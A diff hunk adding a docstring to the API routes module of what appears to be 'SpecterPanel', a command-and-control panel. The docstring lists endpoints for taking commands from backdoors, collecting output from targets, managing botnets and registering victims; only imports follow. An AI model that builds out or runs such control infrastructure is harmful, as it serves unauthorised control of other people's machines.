@@ -1,3 +1,29 @@
+# -*- coding: utf-8 -*-
+"""
+SpecterPanel - API Routes
+This module defines the API routes for the SpecterPanel application.
+These routes handle various API requests related to command execution,
+target registration, and instruction retrieval.
+It includes routes for receiving commands from backdoors,
+saving command outputs, managing botnets, and handling socket connections.
+It uses Flask's Blueprint to organize the API routes and SQLAlchemy for database interactions.
+Routes are defined for:
+- Receiving and executing commands from backdoors
+- Saving command outputs from targets
+- Retrieving botnet information for targets
+- Registering new targets with the API
+- Retrieving instructions for targets
+- Managing socket connections for targets
+This module also includes error handling and logging for API requests.
+Routes list:
+- /api/ApiCommand/<target_name>: Receives commands from backdoors
+- /api/Apicommand/save_output: Saves command outputs from targets
+- /api/BotNet/<target_name>: Retrieves botnet information for targets
+- /api/registor_target: Registers new targets with the API
+- /api/get_instraction/<target_name>: Retrieves instructions for targets
+- /api/socket/<target_name>: Manages socket connections for targets
+"""
+
 from flask import Blueprint,jsonify,request,session
 from sqlalchemy.orm import sessionmaker
 from datetime import datetime
